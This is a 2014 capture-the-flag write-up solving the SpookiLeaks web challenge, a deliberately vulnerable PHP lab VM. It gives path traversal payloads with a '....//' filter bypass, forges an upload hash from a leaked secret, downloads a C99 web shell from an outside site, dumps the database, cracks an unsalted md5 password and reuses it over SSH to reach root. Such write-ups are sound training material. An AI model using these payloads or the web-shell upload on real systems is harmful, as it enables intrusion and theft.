---
title: CactusCon 2014 CTF Writeup
tags: ['Linux', 'PHP', 'Hacking', 'CTF']
published: 2014-04-15 21:12:42
---

This is a write up to the 2014 CactusCon web application (SpookiLeaks)
challenge. You can grab the SpookiLeaks-VM here and try the challenge yourself
before reading the solution.

---

## !!! WARNING: SPOILERS BELOW !!!

---

The First Clue

The first clue to solving the challenge is hidden in plain sight. Before even
logging in if we scan the pre-loaded images on the Spooky Images page there's
one image with the following comment:

    01110010011011110110001001101111011101000111001100101110011101000111100001110100

Binary should be a red flag in any CTF. By doing a simple binary to ASCII
conversion we get the following output:

Ah-ha! [robots.txt](http://www.robotstxt.org/robotstxt.html)... By checking 
`/robots.txt` we find the following:

    User-agent: *
    Disallow: /secret_docs/file-tree.txt

Here we find mention of `/secret_docs/file-tree.txt` with a rule of "Disallow".
Fortunately, this rule is only intended to be read by web-crawlers and has no
actual affect on our ability to read the file. By visiting 
`/secret_docs/file-tree.txt` we find [this](https://raw.githubusercontent.com/PHX2600/spookileaks/master/webroot/secret_docs/file-tree.txt).

Score! We just found a complete listing of the application file structure. It's
a pretty long list of files but there's a few things worth noting:

  - `Docs/flag.txt` - This is obviously our target.
  - `Controller\Auth\CustomPasswordHasher.php` - This could tell us about the
    way user account passwords are hashed.
  - `webroot/uploads/` - This is where user files are uploaded to, indicated by 
    `[ User uploads ]`. This means any files uploaded to the server will be
    publicly accessible.

## The Application

We have now exposed a lot of information about our application but we still
don't have a vector of attack. Let's start assessing the functionality of the
app.

We'll start by registering an account (any user/pass will do). Once registered
we gain the ability to add an image from the `/images/manage` page. On first
pass let's just use the app as intended. Add a title, select an image (with 
proper extension type) from our computer and add a comment. Submit the form and
we now see our image on the left hand side of the page. Nothing terribly
interesting yet. Let's see what this form is actually doing. By viewing the
source of the `/images/manage` page a few things should catch our eye:

  - There's an hidden field in the image submission form referencing a `file_hash`.
  - This page loads a `/js/images.js` script that isn't seen on other pages.
  - The images on this page are loaded via a URL parameter: `/images/media?file=image_name.jpg`

Upon inspection of `/js/images.js` we find the following:

```javascript
$('.image-file-upload-input:file').change(function(event) {

    // Initialize formData object
    var fileName = $(this).val().split('\\').pop();

    $.post('/images/hash', { fileName: fileName }, function(data) {

        // Parse JSON data
        var obj = $.parseJSON(data);

        if (obj.file_hash) {

            // Set the file hash input value
            $('.image-file-hash-input').val(obj.file_hash);

        }

    });

});
```

This is pretty straight forward. On selection of a file for uploading, a post
request is made to `/images/hash` containing the file name in the post data. The
returned data is then set as the value of the hidden `file_hash` field and this
gets sent to the server with the form on submission. By using Firebug or the
browsers buit-in developer tools we can see the request being made on file
selection and the data returned. The data we get back from the jQuery post
appears to be a sha1 hash. With some additional analysis and playing with the
form and the hashing function we can tell that the hash generated isn't a direct
sha1 of the file name. Also, if we modify the hash after generation the file
upload form fails to post any data. Lastly, attempting to upload a file with an
extension other than those listed as acceptable fails upon submission as well.

Let's move on for now and look at the suspicious file loading URL. Whenever a
file is loaded via URL parameters there's a good chance it's vulnerable to a
[path traversal attack](https://www.owasp.org/index.php/Path_Traversal). Let's
try a basic attack:

    /images/media?file=../../../../../etc/passwd

This results in an error: `File "etc/passwd" Not Found`. It's important to note
that the returned error does not contain any dot-dot-slashes. This means they're
sanitizing this value but there's still a chance it might not be sanitized
properly. Knowing the input and output of this unkown function we can make a
guess as to what it's doing internally and exploit that. In this case, a good
guess is that they are replacing all instanced of `../` with nothing. We can
test that out by submitting `....//`. If we're right the inner `../` will be
replaced with nothing leaving a single `../` in it's place. Let's test that:

    /images/media?file=....//....//....//....//....//etc/passwd

It works! Let's try grabbing that flag we saw in the file tree from earlier:

    /images/media?file=....//....//Docs/flag.txt

It's never that easy is it? This gives us an error but this time it's a
"Permission denied" error. That means the web server doesn't have permissions to
read the flag, thus, we're going to have to find a way to read the flag as a
user with permission (root perhpse?).

## Reconnaissance

At this point we have everything we need to start gathering intel. The path
traversal attack plus the file tree give us access to the complete source code
of the application as well any other files on the server with laxed permissions.
To save some time, I'll now go over some of the key files our investigation
should have turned up and their significance:

First, in the `/etc/passwd` file we tried above we find the "ghost" user:

    ghost:x:1000:1000:ghost,,,:/home/ghost:/bin/bash

This, along with the contents of `/etc/group` let us know the "ghost" account
has sudo access. Thus, if we can gain access to the "ghost" user account we can
read the contents of flag.txt.

Okay, let's go back to the image submission form, specifically, the hidden
`file_hash` form field. By viewing the source of the ImagesController at 
`/images/media?file=....//....//Controller/ImagesController.php` we see that
this hash is checked against a hash of the submitted file's name:

```php
if (!$file['error'] && $hash === $this->hashFile($file['name'])) {
```

Looking at the main `/images/hash` action we see a check against the file's
extension:

```php
// Get the file name
$fileName = trim($this->request->data['fileName']);

// Set array of allowed file extensions
$allowedExtensions = array('png', 'gif', 'jpg', 'jpeg', 'bmp');

// Get file extension from source image
$extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

// Verify file is of an acceptable type
if (in_array($extension, $allowedExtensions)) {

    // Super duper, top secret hashing algorithm
    $data['file_hash'] = $this->hashFile($fileName);

} else {

    // Return false on failure
    $data['file_hash'] = false;

}
```

And viewing the referenced `hashFile()` function we see the following:

```php
private function hashFile($fileName) {

    // Super duper, top secret hashing algorithm
    return sha1($fileName . 'ErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd');

}
```

That's a bingo! We now have the method of file hashing along with the secret
string that gets concatenated with the file name. With this information we can
actively exploit the file upload form and generate a valid hash for any file we
choose.

## Shelling the Server

It's now time to grab a fresh copy of [C99](http://www.r57shell.net/) (I also
recommend [Weevely](https://github.com/epinna/weevely3) but for this example
we'll stick to the more simple C99 shell) and generate a valid hash for
uploading:

    $ wget http://www.r57shell.net/shell/c99.txt
    $ mv c99.txt not_a_shell.php
    $ echo -n "not_a_shell.phpErrrMahGerrds_Sup3rS3cr3t_P@ssw0rd" | sha1sum

This gives us:

    90d5aeb035bbcd0df8f5e84721d3eb8f3321ff8c

Now we can go back to the upload form, select our `c99.php` file, then using
Firebug or the browsers built-in web developer tools modify the value of the 
hidden `file_hash` element and set it to our pre-generated hash. This time, when
we submit the form, the file upload succeeds without error. Navigating to 
`/uploads/not_a_shell.php` now brings up our shell.

From here accessing any aspect of the web application or it's database are
trivial. Let's investigate the database now. First, nab the credentials by
navigating to `/images/media?file=....//....//Config/database.php`:

```php
public $default = array(
    'datasource' => 'Database/Mysql',
    'persistent' => false,
    'host'       => 'localhost',
    'login'      => 'spookileaks',
    'password'   => 'rmPtShWVyrCcxfJaBvsPL4t2',
    'database'   => 'spookileaks',
    'prefix'     => '',
    //'encoding' => 'utf8',
);
```

Using C99, we can dump this data easily and see the following:

    id  username    password                            role    created                 modified
    1   ghost       37988bb25d36058671f959f06a7d51b9    admin   2014-04-03 20:53:19     2014-04-03 20:53:19

That's the same user name that we found in `/etc/passwd` and that password hash
looks like a basic md5. We can verify that by checking out he source of that
custom password hasher at `/media?file=....//....//Controller/Component/Auth/CustomPasswordHasher.php`:

```php
public function hash($password) {

    // Hash the password
    return md5($password); // md5 4 life

}
```

Yup, unsalted md5. If the password was salted we might start thinking about
brute forcing it. However, unsalted passwords are often easily searchable due
to them being pre-computed en masse and published online. For our case, a simple
[Google search](https://encrypted.google.com/search?q=37988bb25d36058671f959f06a7d51b9)
reveals the password as `ScoobySnacks`.

## The Final Pieces

We now need to be able to log in to the the system. Without physical access to
the box we can perform an [nmap](http://nmap.org/) scan to see what services are
up and running:

    $ nmap -sT 192.168.0.170

    Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-16 10:48 MST
    Nmap scan report for 192.168.0.170
    Host is up (0.0034s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds

Here we see that SSH is running on the target machine. The last question
remaining now is wether or not the `ghost` user was smart enough to use
different passwords for his system account and his web application accounts.
All we have to do to test this is SSH into the server with his credentials:

    $ ssh ghost@192.168.0.170  # Substitute your VMs IP
    ghost@192.168.0.170's password:

Enter the ghost user's password and BOOM! We're in! All we have to do is grab
the content of flag:

    $ sudo cat /var/www/SpookiLeaks/Docs/flag.txt
    [sudo] password for ghost:

And you've got the flag:

        CONGLATURATION !!!

        YOU HAVE COMPLETED
        A GREAT GAME.

    AND PROOVED THE JUSTICE
        OF OUR CULTURE.

        NOW GO AND REST OUR
            HEROES !
